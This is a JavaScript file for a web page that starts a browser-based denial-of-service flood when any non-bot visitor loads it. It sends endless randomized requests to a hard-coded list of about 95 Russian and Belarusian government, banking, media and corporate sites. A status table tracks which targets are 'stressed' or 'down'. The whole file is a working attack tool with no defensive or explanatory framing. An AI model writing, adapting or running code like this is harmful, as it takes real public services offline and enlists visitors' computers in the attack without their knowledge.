window.onload = function () {
    let isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
    if (!isBot) {
        var fightForUkraine = new FIGHT();
    }
}

class StatusTable {
    parentDiv = undefined;
    updateIntervalID = undefined;
    TARGET_STRESSED_THRESHOLD = 0.50;   // Percentage of 500 - 511 codes or timeouts we need to mark a server as 'down'.
    TARGET_TIMEOUT_THRESHOLD = 0.95;    // If # requests / # timeouts > % defined here.
    MIN_REQUESTS_BEFORE_MARKING = 50;   // Minimum number of requests before marking targets as down or stressed.
    targetInfoFields = {};

    constructor(parentDivID) {
        this.parentDiv = document.getElementById("parentDivID");

        for (var t = 0; t < targets.length; t++) {
            this.newTarget(targets[t]);
        }

        this.updateIntervalID = setInterval(() => {
            targets.map(this.drawUpdate, this);
        }, 1000); 
    }

    newTarget(target) {
        let statDiv = document.createElement("DIV");
        statDiv.classList.add("target-status__container");

        let urlDiv = document.createElement("DIV");
        urlDiv.classList.add("target-url");
        urlDiv.innerText = target;

        let reqDiv = document.createElement("DIV");
        reqDiv.classList.add("req-count");
        reqDiv.innerText = 0;

        let errDiv = document.createElement("DIV");
        errDiv.classList.add("err-count");
        errDiv.innerText = 0;

        let toDiv = document.createElement("DIV");
        toDiv.classList.add("to-count");
        toDiv.innerText = 0;

        // This object contains any data we'll track for each target.
        let targetObj = {};
        targetObj["errCount"] = 0;          // Total number of errored responses.
        targetObj["reqCount"] = 0;          // Total number of requests sent.
        targetObj["timeoutCount"] = 0;      // Determines if connection is timing out.
        targetObj["statDiv"] = statDiv;     // The container div for stats.
        targetObj["errCountDiv"] = errDiv;
        targetObj["reqCountDiv"] = reqDiv;
        targetObj["toCountDiv"] = toDiv;
        targetObj["isDown"] = false;        // Whether we've marked this particular site as down.
        targetObj["isStressed"] = false;    // Whether we've marked this particular site as stressed.

        statDiv.appendChild(urlDiv);
        statDiv.appendChild(reqDiv);
        statDiv.appendChild(errDiv);
        statDiv.appendChild(toDiv);
        this.parentDiv.appendChild(statDiv);
        this.targetInfoFields[target] = targetObj;
    }

    addTarget(target) {
        this.newTarget(target);
    }

    targetErrUpdate(target, status) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.errCount++;

        if ((tarInfo.reqCount / tarInfo.errCount) > this.TARGET_STRESSED_THRESHOLD && tarInfo.isStressed === false && tarInfo.reqCount > this.MIN_REQUESTS_BEFORE_MARKING) {
            this.markAsStressed(target);
            return;
        }

        if (tarInfo.isStressed === true && (tarInfo.reqCount / tarInfo.errCount) < this.TARGET_STRESSED_THRESHOLD) {
            this.unmarkAsStressed(target);
            return;
        }
    }

    targetTimeoutUpdate(target, status) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.timeoutCount++;

        if ((tarInfo.reqCount / tarInfo.timeoutCount) > this.TARGET_TIMEOUT_THRESHOLD && tarInfo.isDown === false && tarInfo.reqCount > this.MIN_REQUESTS_BEFORE_MARKING) {
            this.markAsDown(target);
            return;
        }

        if (tarInfo.isDown === true && (tarInfo.reqCount / tarInfo.timeoutCount) < this.TARGET_TIMEOUT_THRESHOLD) {
            this.unmarkAsDown(target);
            return;
        }
    }
    
    targetReqUpdate(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.reqCount++;
    }
    
    drawUpdate(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.reqCountDiv.innerText = tarInfo.reqCount;
        tarInfo.errCountDiv.innerText = tarInfo.errCount;
        tarInfo.toCountDiv.innerText = tarInfo.timeoutCount;
    }

    markAsDown(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.statDiv.classList.add("target-down");
        tarInfo.isDown = true;
        tarInfo.statDiv.classList.remove("target-stressed");
    }

    unmarkAsDown(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.statDiv.classList.remove("target-down");
        tarInfo.isDown = false;
    }

    markAsStressed(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.statDiv.classList.add("target-stressed");
        tarInfo.isStressed = true;
    }

    unmarkAsStressed(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.statDiv.classList.remove("target-stressed");
        tarInfo.isStressed = false;
    }
}

class FIGHT {
    statTable = undefined;
    CONCURRENCY_LIMIT = targets.length * 2;     // Any more than this and the rate of IP banning skyrockets.
    queue = [];
    attacking = true; 

    constructor() {
        this.statTable = new StatusTable("status-parent-div");
        targets.map(this.flood, this);
    }

    attackToggle() {
        this.attacking = !this.attacking;
    }

    async fetchWithTimeout(resource, options) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), options.timeout);
        return fetch(resource, {
            method: 'GET',
            mode: 'no-cors',
            signal: controller.signal
        }).then((response) => {
            clearTimeout(id);
            return response;
        }).catch((error) => {
            clearTimeout(id);
            throw error;
        })
    }

    async flood(target) {
        var counter = 0;
        while (this.attacking) {
            if (this.queue.length > this.CONCURRENCY_LIMIT) {
                await this.queue.shift();
            }
            var rand = counter % 3 === 0 ? '' : ('?' + Math.random() * 1000);
            this.queue.push(this.fetchWithTimeout(target + rand, {timeout: 2000}).catch((error) => {
                this.statTable.targetTimeoutUpdate(target, 27015);
            }).then((response) => {
                if (response && !response.ok) {
                    this.statTable.targetErrUpdate(target, response.status);
                }
                this.statTable.targetReqUpdate(target);
            }));
            counter = (counter === Number.MAX_VALUE) ? 0 : counter + 1;
        }
    }
}

var targets = [
    'https://lenta.ru/',
    'https://ria.ru/',
    'https://ria.ru/lenta/',
    'https://www.rbc.ru/',
    'https://www.rt.com/',
    'http://kremlin.ru/',
    'http://en.kremlin.ru/',
    'https://smotrim.ru/',
    'https://tass.ru/',
    'https://tvzvezda.ru/',
    'https://vsoloviev.ru/',
    'https://www.1tv.ru/',
    'https://www.vesti.ru/',
    'https://online.sberbank.ru/',
    'https://sberbank.ru/',
    'https://zakupki.gov.ru/',
    'https://www.gosuslugi.ru/',
    'https://er.ru/',
    'https://www.rzd.ru/',
    'https://rzdlog.ru/',
    'https://vgtrk.ru/',
    'https://www.interfax.ru/',
    'https://www.mos.ru/uslugi/',
    'http://government.ru/',
    'https://mil.ru/',
    'https://www.nalog.gov.ru/',
    'https://customs.gov.ru/',
    'https://pfr.gov.ru/',
    'https://rkn.gov.ru/',
    'https://www.gazprombank.ru/',
    'https://www.vtb.ru/',
    'https://www.gazprom.ru/',
    'https://lukoil.ru',
    'https://magnit.ru/',
    'https://www.nornickel.com/',
    'https://www.surgutneftegas.ru/',
    'https://www.tatneft.ru/',
    'https://www.evraz.com/ru/',
    'https://nlmk.com/',
    'https://www.sibur.ru/',
    'https://www.severstal.com/',
    'https://www.metalloinvest.com/',
    'https://nangs.org/',
    'https://rmk-group.ru/ru/',
    'https://www.tmk-group.ru/',
    'https://yandex.ru/',
    'https://yandex.by/',
    'https://www.polymetalinternational.com/ru/',
    'https://www.uralkali.com/ru/',
    'https://www.eurosib.ru/',
    'https://omk.ru/',
    'https://mail.ru/',
    'https://ok.ru/',
    'https://avito.ru/',
    'https://kinopoisk.ru/',
    'https://mail.rkn.gov.ru/',
    'https://cloud.rkn.gov.ru/',
    'https://mvd.gov.ru/',
    'https://pwd.wto.economy.gov.ru/',
    'https://stroi.gov.ru/',
    'https://proverki.gov.ru/',
    'https://www.gazeta.ru/',
    'https://www.crimea.kp.ru/',
    'https://www.kommersant.ru/',
    'https://riafan.ru/',
    'https://www.mk.ru/',
    'https://api.sberbank.ru/prod/tokens/v2/oauth',
    'https://api.sberbank.ru/prod/tokens/v2/oidc',
    'https://www.vedomosti.ru/',
    'https://sputnik.by/',
    'https://ozon.ru/',
    'https://rambler.ru/',
    'https://gdz.ru/',
    'https://music.yandex.ru/',
    'https://hh.ru/',
    'https://russia-insider.com/',
    'https://rsl.ru/',
    'https://tass.ru/',
    'https://vz.ru/',
    'https://pikabu.ru/',
    'https://bezformata.com/',
    'https://mango.org/',
    'https://ya.ru/',
    'https://business.rk.gov.ru/',
    'https://tvr.by/',
    'https://belmarket.by/',
    'https://belarus.by/',
    'https://belnovosti.by/',
    'https://fsb.ru/',
    'https://ukraina.ru/',
    'https://mid.ru/',
    'https://iz.ru/',
    'https://pravda.sk/',
    'https://vestiprim.com/',
]